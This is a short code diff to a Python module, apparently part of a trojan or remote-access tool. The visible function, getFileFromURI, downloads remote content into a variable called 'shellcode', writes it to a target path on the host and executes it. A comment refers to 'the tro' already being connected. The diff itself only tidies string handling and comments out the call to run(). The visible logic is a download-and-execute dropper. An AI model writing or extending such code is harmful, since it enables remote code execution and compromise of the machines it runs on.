@@ -57,7 +57,7 @@ def run(**args):
   	return "getFileFromURI: Connection refused"
 
 
-  shellcode = r.data.decode("utf-8")
+  shellcode = r.data.decode('utf-8')
   #The data attribute of the response is always set to a byte string representing the response content
   cmd = ""
 
@@ -68,7 +68,7 @@ def run(**args):
     cmd= "./{}".format(OsTargetpath)
   else:
     mon_fichier = open(OsTargetpath, "w")
-    mon_fichier.write(shellcode.__str__())
+    mon_fichier.write(shellcode)
     mon_fichier.close()
     cmd= ScriptExec+" "+OsTargetpath
 
@@ -84,7 +84,7 @@ def run(**args):
   return str("getFileFromURI: file {} successfully started".format(OsTargetpath))
 
 
-run()
+#run()
   #while not is_connected(): #if the tro execute this, so it is already connected
   #time.sleep(20)
 import socket
